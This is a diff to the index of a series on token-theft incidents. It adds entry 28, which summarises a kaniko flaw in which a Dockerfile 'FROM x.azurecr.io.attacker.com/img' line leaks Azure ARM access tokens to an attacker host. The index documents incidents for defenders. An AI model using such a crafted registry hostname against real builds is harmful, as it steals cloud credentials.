@@ -1,4 +1,4 @@
-# Twenty-Seven Token Thefts, One Missing Control — series index
+# Twenty-Eight Token Thefts, One Missing Control — series index
 
 Bearer tokens are strings; strings can be copied. This running series documents real,
 independently-verified token-theft and token-forgery incidents in the OAuth / MCP /
@@ -186,6 +186,13 @@ next theft a non-event.
     the testTransform endpoint, which hands scripts to GroovyClassLoader
     for unauthenticated RCE. No fixed version is marked in the CVE
     record as of publication.
+28. [Twenty-Eight Token Thefts, One Missing Control](kaniko-azure-token-misdelivery-dpop-analysis.md)
+    — CVE-2026-105769: kaniko before 1.25.20 (CRITICAL 9.3) — the ACR
+    credential helper's unanchored regex treats any hostname containing
+    .azurecr.io as an ACR registry, so a Dockerfile FROM
+    x.azurecr.io.attacker.com/img sends the build's Azure AD ARM access
+    token to the attacker's /oauth2/exchange — the token is replayable
+    against ARM and exchangeable for ACR credentials (fixed in 1.25.20).
 
 Written in the "雪中送炭" spirit: expert analysis first, the library second. If this
 month sent you rotating secrets, the control that makes the next theft a non-event is
